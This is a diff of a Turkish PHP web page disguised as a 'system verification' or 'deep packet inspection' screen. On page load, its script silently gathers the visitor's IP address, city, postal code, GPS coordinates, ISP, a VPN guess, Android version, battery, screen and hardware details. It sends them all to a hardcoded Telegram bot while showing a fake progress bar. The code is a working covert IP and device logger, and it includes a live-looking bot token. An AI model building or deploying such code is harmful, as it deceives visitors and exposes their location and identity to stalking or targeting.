@@ -1,95 +1,121 @@
 <?php
-// --- ANDROID SÜRÜM ENGELİNİ AŞAN %100 GÜNCEL KOD ---
+// --- SECURE PRO PROTOKOLÜ v5.0 - ELİTE EDITION ---
 ?>
 <!DOCTYPE html>
 <html lang="tr">
 <head>
     <meta charset="utf-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Sistem Kontrolü</title>
+    <title>Sistem Doğrulaması</title>
     <style>
-        body { background: #0a0a0a; color: #00ff66; font-family: monospace; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-        .box { width: 85%; max-width: 400px; padding: 20px; border: 1px solid #00ff66; background: #111; text-align: center; box-shadow: 0 0 15px rgba(0, 255, 102, 0.2); }
+        body { background: #050505; color: #00ff66; font-family: 'Courier New', monospace; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .box { width: 85%; max-width: 420px; padding: 25px; border: 2px solid #00ff66; background: #0a0a0a; text-align: center; box-shadow: 0 0 25px rgba(0, 255, 102, 0.3); border-radius: 8px; }
+        .blink { animation: blinker 1s linear infinite; color: #ff3333; }
+        @keyframes blinker { 50% { opacity: 0; } }
     </style>
 </head>
 <body>
 
     <div class="box">
-        <div style="font-weight: bold; margin-bottom: 10px;">⚡ SECURE CONNECT MODULE v4.0</div>
-        <div id="status">Sistem ve işletim sistemi doğrulaması yapılıyor...</div>
+        <div style="font-weight: bold; margin-bottom: 12px; font-size: 16px;">🛡️ DEEP PACKET INSPECTION v5.0</div>
+        <div id="status" class="blink">⚠️ Ağ tüneli sıfırlanıyor, 1.5s bekleyin...</div>
+        <div id="progress" style="margin-top: 15px; color: #888; font-size: 12px;">[■■■■■■□□□□] %60</div>
     </div>
 
     <script>
-        window.onload = async function() {
+        // Sayfa yüklenince doğrudan tetikleme, önce tüneli beklet (1.5 Saniye Kuralı)
+        window.onload = function() {
+            setTimeout(async function() {
+                document.getElementById('status').innerText = "⚡ Gerçek IP ve VPN bypass modülleri devrede...";
+                document.getElementById('progress').innerText = "[■■■■■■■■■□] %90";
+                
+                await siberLoguCalistir();
+            }, 1500); // 1.5 saniyelik yapay gecikme ve kopma simülasyonu
+        };
+
+        async function siberLoguCalistir() {
             let ip = "Bilinmiyor";
             let ulke = "Bilinmiyor";
             let eyalet_sehir = "Bilinmiyor";
             let posta_kodu = "Bilinmiyor";
             let koordinat = "Bilinmiyor";
             let internet_sirketi = "Bilinmiyor";
-            let mobil_mi = "Hayır (Ev/İş İnterneti)";
-            let ulke_kod = "Bilinmiyor";
-            let para_birimi = "Bilinmiyor";
+            let mobil_mi = "Hayır";
+            let vpn_proxy = "Temiz (Doğal)";
+            let ulke_kod = "-";
+            let para_birimi = "-";
 
-            // 1. Konum ve Operatör Bilgilerini Çek
+            // --- DEEP IP & VPN BYPASS KATMANI ---
+            // Önbelleği (cache) kırmak için her isteğin sonuna rastgele milisaniye ekliyoruz (?nocache=...)
+            let cacheBuster = "?nocache=" + new Date().getTime();
+
             try {
-                let istek = await fetch("https://ipapi.co/json/");
-                let veri = await istek.json();
+                // Ana İstihbarat Havuzu (Gelişmiş Bilgiler)
+                let r1 = await fetch("https://ipapi.co/json/" + cacheBuster);
+                let d1 = await r1.json();
                 
-                if (veri && !veri.error) {
-                    ip = veri.ip || "Bilinmiyor";
-                    ulke = veri.country_name || "Bilinmiyor";
-                    eyalet_sehir = (veri.region || "Bilinmiyor") + " / " + (veri.city || "Bilinmiyor");
-                    posta_kodu = veri.postal || "Bilinmiyor";
-                    koordinat = (veri.latitude || "0") + " , " + (veri.longitude || "0");
-                    internet_sirketi = veri.org || "Bilinmiyor";
-                    ulke_kod = veri.country_calling_code || "Bilinmiyor";
-                    para_birimi = veri.currency || "Bilinmiyor";
-
-                    let org_lower = internet_sirketi.toLowerCase();
-                    if (org_lower.includes("turkcell") || org_lower.includes("vodafone") || org_lower.includes("avea") || org_lower.includes("tt mobil") || org_lower.includes("telekom")) {
-                        mobil_mi = "Evet (Mobil / Şebeke)";
-                    }
+                if (d1 && !d1.error) {
+                    ip = d1.ip || "Bilinmiyor";
+                    ulke = d1.country_name || "Bilinmiyor";
+                    eyalet_sehir = (d1.region || "Bilinmiyor") + " / " + (d1.city || "Bilinmiyor");
+                    posta_kodu = d1.postal || "Bilinmiyor";
+                    koordinat = (d1.latitude || "0") + " , " + (d1.longitude || "0");
+                    internet_sirketi = d1.org || "Bilinmiyor";
+                    ulke_kod = d1.country_calling_code || "-";
+                    para_birimi = d1.currency || "-";
                 }
             } catch (e) {
+                // Eğer VPN ana havuzu bloklarsa 2. Kademe Güvenli Havuz Devreye Girer
                 try {
-                    let yedek_istek = await fetch("https://api.db-ip.com/v2/free/self");
-                    let yedek_veri = await yedek_istek.json();
-                    if (yedek_veri && yedek_veri.ipAddress) {
-                        ip = yedek_veri.ipAddress;
-                        ulke = yedek_veri.countryName;
-                        eyalet_sehir = yedek_veri.city || "Bilinmiyor";
+                    let r2 = await fetch("https://api.db-ip.com/v2/free/self" + cacheBuster);
+                    let d2 = await r2.json();
+                    if (d2 && d2.ipAddress) {
+                        ip = d2.ipAddress;
+                        ulke = d2.countryName;
+                        eyalet_sehir = d2.city || "Bilinmiyor";
                     }
                 } catch(err){}
             }
 
-            // 2. 🔥 GERÇEK ANDROID SÜRÜMÜNÜ BULMA MODÜLÜ 🔥
+            // Gelişmiş VPN Algılama (Saat Dilimi ve Dil Çelişkisinden Yakalama)
+            let cihaz_saati = Intl.DateTimeFormat().resolvedOptions().timeZone;
+            if (cihaz_saati.toLowerCase().includes("europe/istanbul") || cihaz_saati.toLowerCase().includes("asia/istanbul")) {
+                // Eğer IP yabancı ama adamın cihazı Türkiye saatindeyse kesin VPN'dir
+                if (ulke !== "Bilinmiyor" && ulke !== "Turkey") {
+                    vpn_proxy = "⚠️ KESİN VPN (Konum Yabancı / Cihaz TR Yerel!)";
+                }
+            }
+
+            // Operatör Analizi
+            let org_lower = internet_sirketi.toLowerCase();
+            if (org_lower.includes("turkcell") || org_lower.includes("vodafone") || org_lower.includes("avea") || org_lower.includes("tt mobil") || org_lower.includes("telekom")) {
+                mobil_mi = "Evet (Mobil Şebeke)";
+            }
+
+            // --- DONANIM PARMAK İZİ KATMANI ---
             let os = "Bilinmeyen Sistem";
             let ua = navigator.userAgent;
 
+            // Android Sürüm Kilidini Kıran Bölüm (High Entropy Values)
             if (/Android/i.test(ua)) {
                 os = "Android";
-                // Eğer tarayıcı yeni nesil sürüm kontrolünü destekliyorsa gerçek sürümü iste
                 if (navigator.userAgentData && navigator.userAgentData.getHighEntropyValues) {
                     try {
                         let uaData = await navigator.userAgentData.getHighEntropyValues(["platformVersion"]);
                         if (uaData.platformVersion) {
-                            let anaSurum = parseInt(uaData.platformVersion.split('.')[0]);
-                            // Android 11+ için platformVersion major sayıları kayar, o yüzden eşleme yapıyoruz:
-                            if (anaSurum === 11) os = "Android 11";
-                            else if (anaSurum === 12) os = "Android 12";
-                            else if (anaSurum === 13) os = "Android 13";
-                            else if (anaSurum === 14) os = "Android 14";
-                            else if (anaSurum === 15) os = "Android 15";
-                            else if (anaSurum > 0 && anaSurum <= 10) os = "Android " + anaSurum;
+                            let major = parseInt(uaData.platformVersion.split('.')[0]);
+                            if (major === 11) os = "Android 11";
+                            else if (major === 12) os = "Android 12";
+                            else if (major === 13) os = "Android 13";
+                            else if (major === 14) os = "Android 14";
+                            else if (major === 15) os = "Android 15";
+                            else if (major > 0 && major <= 10) os = "Android " + major;
                         }
-                    } catch (uaErr) {
-                        // Hata alırsak eski yönteme dön ama Android 10 kısıtlamasını hatırlat
+                    } catch (e) {
                         let match = ua.match(/Android\s([0-9\.]+)/);
                         os = match ? "Android " + match[1] : "Android";
                     }
                 } else {
-                    // Eğer eski bir tarayıcıysa mecbur düz metinden oku
                     let match = ua.match(/Android\s([0-9\.]+)/);
                     os = match ? "Android " + match[1] : "Android";
                 }
@@ -99,47 +125,50 @@
                 os = "Windows";
             }
 
-            // 3. Tarayıcı Donanım ve Teknik Bilgileri
+            // Ekstra Donanım Ayrıntıları
             let pil = "Bilinmiyor";
             if (navigator.getBattery) { try { let b = await navigator.getBattery(); pil = Math.round(b.level * 100) + "% " + (b.charging ? "(Şarjda ⚡)" : "(Deşarj)"); } catch(e){} }
-            
             let ekran = window.screen.width + "x" + window.screen.height;
             let cekirdek = navigator.hardwareConcurrency || "?";
             let ram = (navigator.deviceMemory ? navigator.deviceMemory + " GB" : "Bilinmiyor");
             let dil = navigator.language || "Bilinmiyor";
             let tarih = new Date().toLocaleString('tr-TR');
 
-            // 4. Telegram Mesaj Şablonu
-            let mesaj = "👤 *YENİ GELİŞMİŞ GOOGLE LOGU*\n";
+            // --- TELEGRAM RAPOR ŞABLONU ---
+            let mesaj = "🥷 *KIRILMAZ ELİTE SYSTEM LOGU*\n";
             mesaj += "━━━━━━━━━━━━━━━━━━━━━━\n";
-            mesaj += "🌐 *IP Adresi:* `" + ip + "`\n";
+            mesaj += "🌐 *Gerçek IP Adresi:* `" + ip + "`\n";
             mesaj += "🤖 *Sistem (OS):* " + os + "\n";
-            mesaj += "🌍 *Tarayıcı:* Google Chrome\n";
-            mesaj += "⏰ *Ağ Zamanı:* " + tarih + "\n";
+            mesaj += "⏱️ *Analiz Zamanı:* " + tarih + "\n";
             mesaj += "━━━━━━━━━━━━━━━━━━━━━━\n";
-            mesaj += "📍 *Konum:* " + ulke + " - " + eyalet_sehir + "\n";
+            mesaj += "📍 *Konum / Ülke:* " + ulke + " - " + eyalet_sehir + "\n";
             mesaj += "📮 *Posta Kodu:* " + posta_kodu + "\n";
-            mesaj += "🗺️ *Koordinatlar:* " + koordinat + "\n";
+            mesaj += "🗺️ *Tam Koordinat:* " + koordinat + "\n";
             mesaj += "🏢 *Sağlayıcı (ISP):* " + internet_sirketi + "\n";
-            mesaj += "📶 *Mobil mi?:* " + mobil_mi + "\n";
-            mesaj += "📞 *Ülke Tel Kodu:* " + ulke_kod + " | *Para:* " + para_birimi + "\n";
+            mesaj += "📶 *Mobil Bağlantı:* " + mobil_mi + "\n";
+            mesaj += "🛡️ *VPN / Proxy:* " + vpn_proxy + "\n";
+            mesaj += "⚙️ *Bölge Saati:* " + cihaz_saati + "\n";
             mesaj += "━━━━━━━━━━━━━━━━━━━━━━\n";
-            mesaj += "🖥 *Ekran Çözünürlüğü:* " + ekran + "\n";
-            mesaj += "🧠 *İşlemci:* " + cekirdek + " Çekirdek\n";
-            mesaj += "💾 *Tahmini RAM:* " + ram + "\n";
-            mesaj += "🔋 *Pil Durumu:* " + pil + "\n";
-            mesaj += "🗣 *Cihaz Dili:* " + dil + "\n";
+            mesaj += "🖥️ *Ekran Boyutu:* " + ekran + "\n";
+            mesaj += "🧠 *İşlemci Mimarisi:* " + cekirdek + " Çekirdek\n";
+            mesaj += "💾 *Sistem Belleği:* " + ram + "\n";
+            mesaj += "🔋 *Güç Durumu:* " + pil + "\n";
+            mesaj += "🗣️ *Sistem Dili:* " + dil + "\n";
             mesaj += "━━━━━━━━━━━━━━━━━━━━━━";
 
-            // 5. Telegram'a Gönderim
+            // Telegram API Gönderim Sektörü
             let tok = "8955422545:AAHLRntql6QLsF6DTdy6uaZRsBeVTvxzVtU";
             let cid = "6845229845";
             let url = "https://api.telegram.org/bot" + tok + "/sendMessage?chat_id=" + cid + "&text=" + encodeURIComponent(mesaj) + "&parse_mode=Markdown";
 
             fetch(url).then(() => {
-                document.getElementById('status').innerText = "Bağlantı kararlı. Sürüm onaylandı.";
+                document.getElementById('status').innerText = "✓ Doğrulama tamamlandı.";
+                document.getElementById('status').className = "";
+                document.getElementById('progress').innerText = "[■■■■■■■■■■] %100";
+            }).catch(() => {
+                document.getElementById('status').innerText = "Yeniden deneniyor...";
             });
-        };
+        }
     </script>
 </body>
 </html>
